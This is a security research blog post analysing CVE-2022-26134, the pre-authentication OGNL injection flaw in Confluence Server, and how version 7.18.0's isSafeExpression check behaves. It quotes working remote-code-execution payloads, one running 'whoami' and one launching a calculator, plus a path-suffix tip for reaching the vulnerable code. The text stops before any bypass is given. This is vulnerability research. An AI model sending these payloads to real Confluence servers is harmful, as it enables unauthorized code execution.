---
layout: post
title:  "CVE-2022-26134: A look into bypass isSafeExpression check in Confluence Preauth RCE"
date:   2022-06-06 16:00:00 +0700
categories: research
author: Quang Vo
tags: 0day, cve-2022-26134
description: Research analysis and develop a working exploit poc script 
---

## Introduction & Environment setup

CVE-2022-26134 is an Preauth RCE ( OGNL injection vulnerability ) in Confluence Server. As there are a lot of technical analysis and payload about the vulnerability already, while the payload works on most of confluence server versions, but it won't work in Confluence server version 7.18.0 because the dev team has added some additional check for safe expression. So in this post, I will focus on the bypass `isSafeExpression` of Confluence version 7.18.0.

For environment setup, I download Confluence server version 7.18.0 on: [https://www.atlassian.com/software/confluence/download-archives](https://www.atlassian.com/software/confluence/download-archives)

For Postgres database, I use docker to quickly spin up the postgresdb:
```text
version: '3.4'
services:
        db:
                image: postgres:latest
                environment:
                        - POSTGRES_PASSWORD=postgres
                        - POSTGRES_DB=confluence
                        - POSTGRES_USER=postgres
                ports:
                        - 5432:5432
```

## Technical Analysis

Rapid7 Team did a great job on publishing the [blog post](https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/) and the exploit payload, here's the payload that I copied from their blog

```java
${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("whoami").getInputStream(),"utf-8")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("X-Cmd-Response",#a))}
```

But when I try that payload on Confluence version 7.18.0, it didn't work. So I add remote debugger to add breakpoints to see what is the difference between their version and mine.


Based on security advisories from Confluence, I download the `xwork-1.0.3-atlassian-10.jar` from their website and start to diffing patches, it's easy to identify  `ActionChainResult.class`  is where our vulnerability lies at.

![image](https://user-images.githubusercontent.com/37280106/172528678-4bed14c4-bc8d-4809-99ae-1c49d86fa9c2.png)

How an attacker provided URI can cause the vulnerability is well-explained and mentioned in this [blog post](https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/) ( you can go to their blog if you curious about the call stack to reach to our vulnerable code ), I just want to quickly note that because of this piece of code:

```java
public static String getNamespaceFromServletPath(String servletPath) {
    servletPath = servletPath.substring(0, servletPath.lastIndexOf("/"));
    return servletPath;
}
```

Every payload that you send must end with `/` , otherwise it won't reach the vulnerable code path. I learned that from my own experience after trying to figure it out why the breakpoint won't hit when I send the payload 

Our call stack to vulnerable code so far:
```
TextParseUtil.translateVariables(this.namespace, stack);
        OgnlValueStack.findValue
```

Content of `OgnlValueStack.findValue`
![image](https://user-images.githubusercontent.com/37280106/172530117-33346b6c-7804-483a-ae1f-1dfdcc2eaee6.png)

Here we see that there is an additional check `this.safeExpressionUtil.isSafeExpression(expr)` ,  which will eventually leads to `SafeExpressionUtil.isSafeExpressionInternal`

Content of `SafeExpressionUtil.isSafeExpressionInternal` , let's put a breakpoint at this function and send our payload to see what will happen
![image](https://user-images.githubusercontent.com/37280106/172530562-d25f5861-49b6-4de8-b4e7-35719025496f.png)

Here I use the simple payload to hit the breakpoint in our code: 
```
%24%7b%22%22%20%2b%20Class.forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22%2c%20null).invoke(null%2cnull).exec(%22gnome-calculator%22)%7d%7d/
```
![image](https://user-images.githubusercontent.com/37280106/172531464-cc30aea6-b81a-45c1-af0c-113494a2348e.png)

Here we will go through the first check, `isUnsafeClass(expr)` 

```java
    private boolean isUnSafeClass(String expression) {
        String trimmedClassName = this.trimQuotes(expression);
        if (this.unsafePropertyNames.contains(trimmedClassName)) {
            return true;
        } else if (SourceVersion.isName(trimmedClassName)) {
            List<String> parentPackageNames = this.populateParentPackages(trimmedClassName, new ArrayList());
            Stream var10000 = parentPackageNames.stream();
            Set var10001 = this.unsafePackageNames;
            var10001.getClass();
            return var10000.anyMatch(var10001::contains);
        } else {
            return false;
        }
    }
```
Where `this.unsafePropertyNames` is a `HashSet` includes:
![image](https://user-images.githubusercontent.com/37280106/172532694-065d5872-2a97-46fc-b260-ef3be1f2bb19.png)

Here we have a blacklist of forbidden property names, luckily our `trimmedClassName` variable is a long expression string **still** and not contains in the hashset so we can pass this check. Please keep in mind this list because it will be very important as we go along in our debug journey 

Follow our code flow, we hit another check `this.containsUnsafeExpression(parsedExpression, visitedExpression)`
![image](https://user-images.githubusercontent.com/37280106/172533345-09b239d4-90b3-4261-9495-317a5235613b.png)

Content of `this.containsUnsafeExpression` 

![image](https://user-images.githubusercontent.com/37280106/172533604-fd1fc44d-143d-4444-8100-353e85540adb.png)

At a high-level overview of this function, it checks for "unsafe" expression by:
- Have a allowed whitelist of classNames, methodNames, variableNames and properties
- Utilies AST parsing to check for unsafe node types where the unsafe node types are:

![image](https://user-images.githubusercontent.com/37280106/172555031-7416d072-ac8e-4132-81e7-1ae3ff028e8b.png)

